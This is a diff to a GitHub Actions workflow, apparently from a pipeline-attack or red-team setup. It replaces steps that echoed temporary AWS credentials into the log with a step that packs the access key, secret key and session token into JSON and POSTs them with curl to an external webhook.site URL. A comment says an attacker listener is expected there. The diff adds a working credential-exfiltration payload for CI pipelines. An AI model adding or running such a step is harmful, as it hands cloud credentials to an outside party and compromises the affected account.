@@ -27,9 +27,14 @@ jobs:
         run: aws sts get-caller-identity
         shell: bash
 
-      - name: Exfiltrate Assumed Role Credentials
+      - name: Exfiltrate Assumed Role Credentials to External Host
         run: |
-          echo "ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
-          echo "SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
-          echo "SESSION_TOKEN: $AWS_SESSION_TOKEN"
+          # Construct a JSON payload using the temporary credentials
+          CREDS_JSON="{\"AccessKeyId\":\"$AWS_ACCESS_KEY_ID\",\"SecretAccessKey\":\"$AWS_SECRET_ACCESS_KEY\",\"SessionToken\":\"$AWS_SESSION_TOKEN\"}"
+          
+          # Send the JSON payload to an external server via HTTP POST
+          # Ensure attacker has a listener configured at this endpoint
+          curl -X POST -H "Content-Type: application/json" \
+               -d "$CREDS_JSON" \
+               https://webhook.site/4f72ac78-bfe4-4c2e-a15b-df9696c49b27
         shell: bash
